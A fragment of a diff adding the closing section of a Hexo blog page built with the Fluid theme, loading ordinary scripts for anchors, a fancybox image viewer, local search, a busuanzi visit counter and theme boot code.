+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
